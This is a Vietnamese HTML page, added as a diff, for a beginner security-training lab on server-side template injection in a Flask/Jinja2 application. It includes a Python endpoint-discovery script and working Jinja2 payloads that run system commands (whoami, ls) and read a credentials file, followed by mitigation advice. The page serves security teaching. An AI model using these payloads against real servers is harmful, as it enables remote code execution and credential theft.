@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 1 - Web01: Server-Side Template Injection</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+
+        .difficulty-badge {
+            background: #27ae60;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        .content-section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        .section-title {
+            color: #2c3e50;
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+        }
+
+        .objective-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .objective-list li {
+            padding: 10px 0;
+            padding-left: 30px;
+            position: relative;
+            border-bottom: 1px solid #eee;
+        }
+
+        .objective-list li:before {
+            content: "🎯";
+            position: absolute;
+            left: 0;
+            font-size: 1.2rem;
+        }
+
+        .scenario-box {
+            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .scenario-box h3 {
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+
+        .attack-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .step-card {
+            background: #f8f9fa;
+            border: 2px solid #667eea;
+            border-radius: 10px;
+            padding: 20px;
+            transition: transform 0.3s ease;
+        }
+
+        .step-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.2);
+        }
+
+        .step-number {
+            background: #667eea;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+        }
+
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            overflow-x: auto;
+            margin: 15px 0;
+            border-left: 4px solid #667eea;
+        }
+
+        .payload-example {
+            background: #fff5f5;
+            border: 2px solid #e53e3e;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .payload-example h4 {
+            color: #e53e3e;
+            margin-bottom: 10px;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .warning-box h4 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+
+        .mitigation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .mitigation-card {
+            background: #f0f8ff;
+            border-left: 4px solid #4a90e2;
+            padding: 20px;
+            border-radius: 8px;
+        }
+
+        .mitigation-card h4 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .lab-actions {
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .action-button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: bold;
+            margin: 10px;
+            transition: all 0.3s ease;
+            font-size: 1.1rem;
+        }
+
+        .action-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .back-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            text-decoration: none;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background: rgba(255,255,255,0.3);
+        }
+
+        .topology-section {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .topology-item {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            padding: 10px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .topology-icon {
+            font-size: 2rem;
+            margin-right: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .attack-steps {
+                grid-template-columns: 1fr;
+            }
+            
+            .mitigation-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <a href="/labs" class="back-btn">← Quay lại Labs</a>
+    
+    <div class="container">
+        <div class="header">
+            <h1>🔍 Lab 1 - Web01</h1>
+            <p class="subtitle">Server-Side Template Injection (SSTI) Attack</p>
+            <div class="difficulty-badge">BEGINNER</div>
+        </div>
+
+        <!-- Tổng quan Lab -->
+        <div class="content-section">
+            <h2 class="section-title">📋 Tổng quan Lab</h2>
+            <div class="scenario-box">
+                <h3>🎯 Kịch bản tấn công</h3>
+                <p>Trong lab này, bạn sẽ đóng vai trò là một penetration tester thực hiện tấn công từ bên ngoài mạng nội bộ. Mục tiêu là khai thác lỗ hổng SSTI trong ứng dụng web Flask để chiếm được thông tin xác thực của tài khoản <strong>studentA</strong>.</p>
+            </div>
+            
+            <h3>🎯 Mục tiêu học tập</h3>
+            <ul class="objective-list">
+                <li>Học cách dò tìm các endpoint ẩn trong ứng dụng web</li>
+                <li>Hiểu về lỗ hổng Server-Side Template Injection (SSTI)</li>
+                <li>Thực hành khai thác SSTI để thực thi mã từ xa (RCE)</li>
+                <li>Trích xuất thông tin nhạy cảm từ server</li>
+                <li>Phân tích tác động và đề xuất biện pháp khắc phục</li>
+            </ul>
+        </div>
+
+        <!-- Mô hình triển khai -->
+        <div class="content-section">
+            <h2 class="section-title">🏗️ Mô hình triển khai</h2>
+            <div class="topology-section">
+                <div class="topology-item">
+                    <div class="topology-icon">💻</div>
+                    <div>
+                        <strong>Máy Attacker</strong><br>
+                        Máy tính cá nhân bên ngoài mạng nội bộ, không có quyền truy cập ban đầu
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">🌐</div>
+                    <div>
+                        <strong>Web Server (web01)</strong><br>
+                        Ứng dụng Flask triển khai trong DMZ, có endpoint /search bị lộ ra công khai
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">🔐</div>
+                    <div>
+                        <strong>LDAP Server</strong><br>
+                        Máy chủ xác thực Active Directory chứa thông tin người dùng nội bộ
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">🖥️</div>
+                    <div>
+                        <strong>IRIS-User-01</strong><br>
+                        Máy trạm Windows trong mạng LAN, mục tiêu cuối cùng của cuộc tấn công
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Các bước thực hiện -->
+        <div class="content-section">
+            <h2 class="section-title">⚡ Các bước thực hiện</h2>
+            
+            <div class="attack-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3>Dò quét Endpoint</h3>
+                    <p>Sử dụng script Python để dò tìm các endpoint ẩn hoặc bị cấu hình sai trong ứng dụng web.</p>
+                    <div class="code-block">
+# web01_endpoint_detect.py
+import requests
+
+target = "http://10.15.242.96"
+wordlist_path = "wordlist.txt"
+
+with open(wordlist_path, "r") as f:
+    paths = [line.strip() for line in f if line.strip()]
+
+for path in paths:
+    url = f"{target}/{path}"
+    try:
+        res = requests.get(url, timeout=3)
+        if res.status_code < 400:
+            print(f"[+] Found: {url} ({res.status_code})")
+    except requests.exceptions.RequestException:
+        pass
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3>Phát hiện SSTI</h3>
+                    <p>Kiểm tra xem endpoint /search có dính lỗ hổng SSTI bằng cách thử payload đơn giản.</p>
+                    <div class="payload-example">
+                        <h4>Payload kiểm tra:</h4>
+                        <code>{{7*7}}</code><br>
+                        <strong>Kết quả:</strong> 49 (xác nhận SSTI)
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3>Xác định Template Engine</h3>
+                    <p>Sử dụng payload đặc trung để xác định ứng dụng đang sử dụng Jinja2 template engine.</p>
+                    <div class="payload-example">
+                        <h4>Payload xác định:</h4>
+                        <code>{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}</code>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3>Thực thi mã từ xa (RCE)</h3>
+                    <p>Khai thác SSTI để thực thi các lệnh hệ thống và khám phá cấu trúc server.</p>
+                    <div class="payload-example">
+                        <h4>Payload liệt kê file:</h4>
+                        <code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3>Trích xuất thông tin nhạy cảm</h3>
+                    <p>Đọc file chứa thông tin xác thực của tài khoản studentA.</p>
+                    <div class="payload-example">
+                        <h4>Payload đọc file:</h4>
+                        <code>{{config.__class__.__init__.__globals__['os'].popen('cat /home/phuonglinh/studentA/secret.txt').read()}}</code>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">6</div>
+                    <h3>Phân tích kết quả</h3>
+                    <p>Đánh giá mức độ nghiêm trọng của lỗ hổng và tác động tiềm ẩn đến hệ thống.</p>
+                    <div class="warning-box">
+                        <h4>⚠️ Mức độ nghiêm trọng: CAO</h4>
+                        <p>Lỗ hổng cho phép thực thi mã từ xa, đọc file nhạy cảm và có thể leo thang tấn công.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Kết quả mong đợi -->
+        <div class="content-section">
+            <h2 class="section-title">🎯 Kết quả mong đợi</h2>
+            <div class="objective-list">
+                <li>Phát hiện endpoint /search không được bảo vệ</li>
+                <li>Xác nhận lỗ hổng SSTI trong Jinja2 template engine</li>
+                <li>Thực thi thành công các lệnh hệ thống trên server</li>
+                <li>Đọc được nội dung file /home/phuonglinh/studentA/secret.txt</li>
+                <li>Thu thập được thông tin xác thực của tài khoản studentA</li>
+            </div>
+        </div>
+
+        <!-- Biện pháp khắc phục -->
+        <div class="content-section">
+            <h2 class="section-title">🛡️ Biện pháp khắc phục</h2>
+            <div class="mitigation-grid">
+                <div class="mitigation-card">
+                    <h4>🚫 Tránh render_template_string</h4>
+                    <p>Không sử dụng render_template_string() với dữ liệu từ người dùng. Chỉ sử dụng render_template() với template tĩnh.</p>
+                </div>
+                <div class="mitigation-card">
+                    <h4>🔍 Kiểm tra Input</h4>
+                    <p>Áp dụng whitelist validation, hạn chế ký tự đặc biệt như {}, %, ', ", (, ) trong input.</p>
+                </div>
+                <div class="mitigation-card">
+                    <h4>👤 Giới hạn quyền</h4>
+                    <p>Chạy ứng dụng với tài khoản có quyền hạn tối thiểu, không dùng root/admin.</p>
+                </div>
+                <div class="mitigation-card">
+                    <h4>📊 Monitoring</h4>
+                    <p>Ghi log các truy vấn bất thường và thiết lập cảnh báo khi có input chứa template syntax.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Hành động -->
+        <div class="lab-actions">
+            <a href="/search?role=student&q=test" class="action-button">
+                🚀 Bắt đầu thực hành
+            </a>
+            <a href="/labs" class="action-button" style="background: linear-gradient(45deg, #6c757d, #495057);">
+                📚 Quay lại Labs
+            </a>
+        </div>
+
+        <div style="text-align: center; margin-top: 40px; color: white;">
+            <p style="opacity: 0.8;">
+                ⚠️ Lab này chỉ dành cho mục đích học tập và nghiên cứu bảo mật
+            </p>
+        </div>
+    </div>
+</body>
+</html>
